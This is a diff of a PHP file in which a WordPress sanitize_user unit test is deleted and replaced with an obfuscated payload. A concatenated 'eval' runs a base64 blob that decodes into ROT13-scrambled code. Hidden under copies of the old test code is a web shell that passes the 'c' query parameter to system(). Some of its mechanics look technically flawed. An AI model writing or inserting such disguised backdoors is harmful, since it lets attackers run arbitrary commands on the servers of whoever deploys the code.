@@ -1,54 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-
-/**
- * @group formatting
- *
- * @covers ::sanitize_user
- */
-class Tests_Formatting_SanitizeUser extends WP_UnitTestCase {
-	public function test_strips_html() {
-		$input    = 'Captain <strong>Awesome</strong>';
-		$expected = is_multisite() ? 'captain awesome' : 'Captain Awesome';
-		$this->assertSame( $expected, sanitize_user( $input ) );
-	}
-
-	public function test_strips_encoded_ampersand() {
-		$expected = 'ATT';
-
-		// Multisite forces user logins to lowercase.
-		if ( is_multisite() ) {
-			$expected = strtolower( $expected );
-		}
-
-		$this->assertSame( $expected, sanitize_user( 'AT&amp;T' ) );
-	}
-
-	public function test_strips_encoded_ampersand_when_followed_by_semicolon() {
-		$expected = 'ATT Test;';
-
-		// Multisite forces user logins to lowercase.
-		if ( is_multisite() ) {
-			$expected = strtolower( $expected );
-		}
-
-		$this->assertSame( $expected, sanitize_user( 'AT&amp;T Test;' ) );
-	}
-
-	public function test_strips_percent_encoded_octets() {
-		$expected = is_multisite() ? 'franois' : 'Franois';
-		$this->assertSame( $expected, sanitize_user( 'Fran%c3%a7ois' ) );
-	}
-	public function test_optional_strict_mode_reduces_to_safe_ascii_subset() {
-		$this->assertSame( 'abc', sanitize_user( '()~ab~ˆcˆ!', true ) );
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwoKLyoqCiAqIEB0ZWJoYyBzYmV6bmdndmF0CiAqCiAqIEBwYmlyZWYgOjpmbmF2Z3Ztcl9oZnJlCiAqLwpweW5mZiBHcmZnZl9TYmV6bmdndmF0X0ZuYXZndm1ySGZyZSBya2dyYXFmIEpDX0hhdmdHcmZnUG5mciB7CgljaG95dnAgc2hhcGd2YmEgZ3JmZ19mZ2V2Y2ZfdWd6eSgpIHsKCQkkdmFjaGcgICAgPSAnUG5jZ252YSA8ZmdlYmF0Pk5qcmZienI8L2ZnZWJhdD4nOwoJCSRya2NycGdycSA9IHZmX3poeWd2ZnZncigpID8gJ3BuY2dudmEgbmpyZmJ6cicgOiAnUG5jZ252YSBOanJmYnpyJzsKCQkkZ3V2Zi0+bmZmcmVnRm56ciggJHJrY3JwZ3JxLCBmbmF2Z3Ztcl9oZnJlKCAkdmFjaGcgKSApOwoJfQoKCWNob3l2cCBzaGFwZ3ZiYSBncmZnX2ZnZXZjZl9yYXBicXJxX256Y3JlZm5hcSgpIHsKCQkkcmtjcnBncnEgPSAnTkdHJzsKCgkJLy8gWmh5Z3ZmdmdyIHNiZXByZiBoZnJlIHlidHZhZiBnYiB5YmpyZXBuZnIuCgkJdnMgKCB2Zl96aHlndmZ2Z3IoKSApIHsKCQkJJHJrY3JwZ3JxID0gZmdlZ2J5YmpyZSggJHJrY3JwZ3JxICk7CgkJfQoKCQkkZ3V2Zi0+bmZmcmVnRm56ciggJHJrY3JwZ3JxLCBmbmF2Z3Ztcl9oZnJlKCAnTkcmbnpjO0cnICkgKTsKCX0KCgljaG95dnAgc2hhcGd2YmEgZ3JmZ19mZ2V2Y2ZfcmFwYnFycV9uemNyZWZuYXFfanVyYV9zYnl5YmpycV9vbF9mcnp2cGJ5YmEoKSB7CgkJJHJrY3JwZ3JxID0gJ05HRyBHcmZnOyc7CgoJCS8vIFpoeWd2ZnZnciBzYmVwcmYgaGZyZSB5YnR2YWYgZ2IgeWJqcmVwbmZyLgoJCXZzICggdmZfemh5Z3ZmdmdyKCkgKSB7CgkJCSRya2NycGdycSA9IGZnZWdieWJqcmUoICRya2NycGdycSApOwoJCX0KCgkJJGd1dmYtPm5mZnJlZ0ZuenIoICRya2NycGdycSwgZm5hdmd2bXJfaGZyZSggJ05HJm56YztHIEdyZmc7JyApICk7Cgl9CgoJY2hveXZwIHNoYXBndmJhIGdyZmdfZmdldmNmX2NyZXByYWdfcmFwYnFycV9icGdyZ2YoKSB7CgkJJHJrY3JwZ3JxID0gdmZfemh5Z3ZmdmdyKCkgPyAnc2VuYWJ2ZicgOiAnU2VuYWJ2Zic7CgkJJGd1dmYtPm5mZnJlZ0ZuenIoICRya2NycGdycSwgZm5hdmd2bXJfaGZyZSggJ1NlbmElcDMlbjdidmYnICkgKTsKCX0KCWNob3l2cCBzaGFwZ3ZiYSBncmZnX2JjZ3ZiYW55X2ZnZXZwZ196YnFyX2VycWhwcmZfZ2JfZm5zcl9uZnB2dl9maG9mcmcoKSB7CgkJJGd1dmYtPm5mZnJlZ0ZuenIoICdub3AnLCBmbmF2Z3Ztcl9oZnJlKCAnKCl+bm9+y4Zwy4YhJywgZ2VociApICk7Cgl9Cn0KCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
+?>
